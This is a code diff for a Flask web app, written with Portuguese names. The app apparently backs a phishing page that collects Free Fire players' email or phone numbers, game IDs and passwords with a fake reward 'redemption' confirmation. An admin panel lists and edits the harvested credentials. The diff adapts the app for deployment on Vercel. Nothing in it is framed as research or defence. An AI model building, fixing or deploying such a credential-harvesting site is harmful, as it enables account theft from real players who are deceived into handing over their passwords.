@@ -6,23 +6,26 @@ from functools import wraps
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'sua_chave_secreta_aqui')
 
+DB_PATH = '/tmp/database.db'
+
 def init_db():
-    conn = sqlite3.connect('database.db')
-    c = conn.cursor()
-    c.execute("""
-    CREATE TABLE IF NOT EXISTS credenciais (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email_ou_telefone TEXT NOT NULL,
-        freefire_id TEXT,
-        senha_freefire TEXT,
-        data_registro TEXT DEFAULT CURRENT_TIMESTAMP
-    )
-    """)
-    conn.commit()
-    conn.close()
+    if not os.path.exists(DB_PATH):
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("""
+        CREATE TABLE IF NOT EXISTS credenciais (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email_ou_telefone TEXT NOT NULL,
+            freefire_id TEXT,
+            senha_freefire TEXT,
+            data_registro TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+        """)
+        conn.commit()
+        conn.close()
 
 def atualizar_tabela_credenciais():
-    conn = sqlite3.connect('database.db')
+    conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("PRAGMA table_info(credenciais)")
     colunas = [col[1] for col in c.fetchall()]
@@ -65,6 +68,11 @@ def nocache(view):
         return response
     return no_cache
 
+@app.before_request
+def before_request():
+    init_db()
+    atualizar_tabela_credenciais()
+
 @app.route('/admin/login', methods=['GET', 'POST'])
 @nocache
 def admin_login():
@@ -91,7 +99,7 @@ def admin_logout():
 def admin():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
-    conn = sqlite3.connect('database.db')
+    conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("SELECT id, email_ou_telefone, freefire_id, senha_freefire, data_registro FROM credenciais ORDER BY data_registro DESC")
     linhas = c.fetchall()
@@ -130,7 +138,7 @@ def login():
     return render_template('login.html')
 
 def salvar_credenciais(email_ou_telefone, freefire_id, senha_freefire):
-    conn = sqlite3.connect('database.db')
+    conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""
         INSERT INTO credenciais (email_ou_telefone, freefire_id, senha_freefire)
@@ -141,7 +149,7 @@ def salvar_credenciais(email_ou_telefone, freefire_id, senha_freefire):
 
 @app.route('/sucesso')
 def sucesso():
-    resgate_id = "FFID-123456"  # Pode gerar ID dinâmico se quiser
+    resgate_id = "FFID-123456"
     return render_template('sucesso.html', resgate_id=resgate_id)
 
 @app.route('/editor/<int:id>', methods=['GET', 'POST'])
@@ -149,7 +157,7 @@ def sucesso():
 def editor(id):
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
-    conn = sqlite3.connect('database.db')
+    conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     if request.method == 'POST':
         email_or_phone = request.form.get('email_or_phone', '').strip()
@@ -174,20 +182,5 @@ def editor(id):
         else:
             return "Registro não encontrado", 404
 
-def handler(request):
-    # Inicializa o banco de dados e atualiza a tabela se necessário
-    init_db()
-    atualizar_tabela_credenciais()
-    # Adapta o request do Vercel para o Flask
-    with app.test_request_context(
-        path=request.path,
-        base_url=request.base_url,
-        method=request.method,
-        headers=request.headers,
-        data=request.get_data(),
-        query_string=request.query_string
-    ):
-        # Copia cookies e session
-        session.update(request.cookies)
-        response = app.full_dispatch_request()
-        return response
+# ✅ Para Vercel: exporta o app como handler WSGI
+handler = app
